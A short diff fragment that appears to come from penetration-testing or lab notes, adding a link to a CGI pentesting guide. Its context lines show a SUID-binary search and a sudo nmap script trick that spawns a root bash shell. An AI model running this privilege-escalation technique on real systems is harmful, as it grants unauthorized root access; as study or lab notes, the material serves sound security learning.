@@ -8,5 +8,6 @@ find / -perm -u=s -type f 2>/dev/null
  echo 'os.execute("/bin/bash")' > $TF
 sudo nmap --script=$TF 
 
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
 
 
